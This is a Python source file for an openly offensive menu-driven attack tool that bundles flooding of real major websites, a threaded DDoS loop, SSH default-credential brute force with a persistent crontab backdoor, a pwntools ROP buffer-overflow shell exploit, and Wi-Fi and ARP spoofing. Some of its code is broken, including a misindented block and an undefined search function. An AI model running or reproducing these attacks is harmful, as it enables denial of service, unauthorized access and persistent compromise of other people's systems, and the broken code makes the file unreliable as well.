import requests
import threading
import time
import aiohttp
import asyncio
import random
import subprocess
import shutil
import os
import paramiko
import platform
from pwn import *
from bs4 import BeautifulSoup
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# List of high-traffic websites for testing
default_urls = [
    "http://example.com", "http://example.org", "http://example.net",
    "http://google.com", "http://facebook.com", "http://amazon.com",
    "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
    "http://twitter.com", "http://instagram.com", "http://linkedin.com",
    "http://netflix.com", "http://bing.com", "http://reddit.com"
]

# List of user-agents to randomize requests
default_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

# Detect operating system
def detect_os():
    return platform.system()

# Web crawler function
def web_crawler(start_url, max_depth=2):
    visited = set()

    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return
        visited.add(url)
        try:
            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)})
            soup = BeautifulSoup(response.text, 'html.parser')
            print(f"Crawled URL: {url}")
            for link in soup.find_all('a', href=True):
                crawl(link['href'], depth + 1)
        except Exception as e:
            print(f"Error crawling {url}: {e}")

    crawl(start_url, 0)

# Fetch URLs asynchronously with aiohttp
async def fetch(session, url, ip=None):
    headers = {'User-Agent': random.choice(default_user_agents)}
    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None
    while True:
        try:
            async with session.get(url, headers=headers) as response:
                await response.text()
                print(f"Fetched {url}")
        except Exception as e:
            print(f"Error: {e}")
            await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting

# Start flood for stress testing
async def start_flood(url, ip=None):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(1000):  # Increase the number of asynchronous requests
            task = asyncio.create_task(fetch(session, url, ip))
            tasks.append(task)
        await asyncio.gather(*tasks)

# Network stress test
def network_stress(ip=None, custom_urls=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    urls = custom_urls if custom_urls else default_urls
    for url in urls:
        tasks.append(loop.create_task(start_flood(url, ip)))
    loop.run_until_complete(asyncio.wait(tasks))

# Simulate Zero-Day Attack (simplified without buffer overflow)
def zero_attack(url_or_ip):
    print(f"Attempting buffer overflow on {url_or_ip}...")

    try:
        binary_path = './vulnerable_binary'
        if not os.path.exists(binary_path):
            raise FileNotFoundError(f"{binary_path} does not exist")

        io = process(binary_path)
        rop = ROP(binary_path)
        rop.call('system', [next(io.search(b'/bin/sh'))])

        payload = b'A' * 128  # Adjust buffer size
        payload += rop.chain()

        io.sendline(payload)
        io.interactive()

        print(f"Buffer overflow attack executed successfully on {url_or_ip}")
    except Exception as e:
        print(f"Buffer overflow attack failed on {url_or_ip}: {e}")

# SSH Brute Force and Backdoor Installation
def ssh_backdoor(url_or_ip):
    print(f"Attempting SSH brute force on {url_or_ip}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
        for username, password in credentials:
            try:
                client.connect(url_or_ip, username=username, password=password, timeout=5)
                print(f"Successfully logged into {url_or_ip} with {username}:{password}")
                break
            except paramiko.AuthenticationException:
                print(f"Failed to login with {username}:{password}")
        else:
            print(f"SSH brute force failed on {url_or_ip}")
            return

        print("Installing backdoor...")
        command = '(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -'
        stdin, stdout, stderr = client.exec_command(command)
        stdout.channel.recv_exit_status()
        print(f"Backdoor installed on {url_or_ip}")

        client.close()

    except Exception as e:
        print(f"Failed SSH attack or backdoor installation on {url_or_ip}: {e}")

# Simulate WiFi spoofing
def wifi_spoofing():
    command = ["airbase-ng", "--essid", "Free_WiFi", "wlan0"]
    subprocess.run(command)

# Simulate ARP spoofing
def arp_spoofing(target_ip, spoof_ip):
    command = ["arpspoof", "-t", target_ip, spoof_ip]
    subprocess.run(command)

# Scrape Chinese textbooks
def scrape_chinese_textbooks(query):
    results = search(query, num_results=10, lang="zh")
    return results

def display_books(books):
    for book in books:
        print(f"Link: {book}")
        print("-" * 20)

# DDOS attack
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Request sent!")
        except requests.exceptions.ConnectionError:
            print("[!!!] Connection error!")

def ddos_attack():
    print(Fore.MAGENTA + """
    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
    """)

    url = input("Enter URL>> ")
    try:
        threads = int(input("Threads: "))
    except ValueError:
        exit("Threads count is incorrect!")

    if threads == 0:
        exit("Threads count is incorrect!")

        if not url.__contains__("http"):
        exit("URL doesnt contain http or https!")

    if not url.__contains__("."):
        exit("Invalid domain!")

    for i in range(0, threads):
        thr = threading.Thread(target=dos, args=(url,))
        thr.start()
        print(str(i + 1) + " threads started!")

# Submenu for Admin (zero attack)
def zero_attack_menu(url_or_ip):
    while True:
        print(Fore.YELLOW + """
        Admin (Zero-Day Attack) Options:
        [1] Zero-Day Exploit (buffer overflow)
        [2] Backdoor Installation
        [3] Exit to Main Menu
        """)
        sub_choice = input("Select an option: ").strip()
        if sub_choice == "1":
            zero_attack(url_or_ip)
        elif sub_choice == "2":
            ssh_backdoor(url_or_ip)
        elif sub_choice == "3":
            break
        else:
            print("Invalid option selected.")
        input("Press Enter to return to the menu...")

# Main user interface
def display_ui():
    while True:
        print(Fore.GREEN + """
         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░███████╗
         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══███╔╝
         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░███╔╝░
         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░███╔╝░░
         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░███████╗
         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░╚══════╝

        [1] Ethernet-based Desktop
        [2] IP-based
        [3] Wireless WiFi-based
        [4] WiFi Spoofing
        [5] ARP Spoofing
        [6] Connect and Stress via Relay IP
        [7] Scrape Chinese Textbooks
        [8] Stress Test a Custom URL
        [9] Web Crawling
        [10] Admin (zero attack)
        [11] DDOS Attack
        [12] Exit
        """)

        choice = input("Select the method (1-12): ").strip()

        if choice == "1":
            ip_address = input("Enter the IP address: ").strip()
            print("Starting Ethernet-based stress test...")
            network_stress(ip_address)
        elif choice == "2":
            url_or_ip = input("Enter the URL or IP address to use: ").strip()
            zero_attack(url_or_ip)
        elif choice == "3":
            print("Selected Wireless WiFi-based stress test")
            wifi_spoofing()
        elif choice == "4":
            print("Selected WiFi Spoofing")
            wifi_spoofing()
        elif choice == "5":
            target_ip = input("Enter the target IP address: ").strip()
            spoof_ip = input("Enter the spoof IP address: ").strip()
            print("Selected ARP Spoofing")
            arp_spoofing(target_ip, spoof_ip)
        elif choice == "6":
            target_ip = input("Enter the target IP address: ").strip()
            relay_ip = input("Enter the relay IP address: ").strip()
            print("Selected Connect and Stress via Relay IP")
            network_stress(target_ip, custom_urls=[relay_ip])
        elif choice == "7":
            query = input("Enter the search query in Chinese: ").strip()
            books = scrape_chinese_textbooks(query)
            display_books(books)
        elif choice == "8":
            custom_url = input("Enter the URL to stress test: ").strip()
            print("Starting stress test on the custom URL...")
            network_stress(custom_urls=[custom_url])
        elif choice == "9":
            start_url = input("Enter the start URL for web crawling: ").strip()
            max_depth = int(input("Enter the maximum depth for web crawling: ").strip())
            print("Starting web crawling...")
            web_crawler(start_url, max_depth)
        elif choice == "10":
            url_or_ip = input("Enter the URL or IP address to use: ").strip()
            zero_attack_menu(url_or_ip)
        elif choice == "11":
            ddos_attack()
        elif choice == "12":
            print("Exiting...")
            break
        else:
            print("Invalid option selected.")

        input("Press Enter to return to the menu...")

if __name__ == "__main__":
    os_name = detect_os()
    print(f"Detected Operating System: {os_name}")
    display_ui()
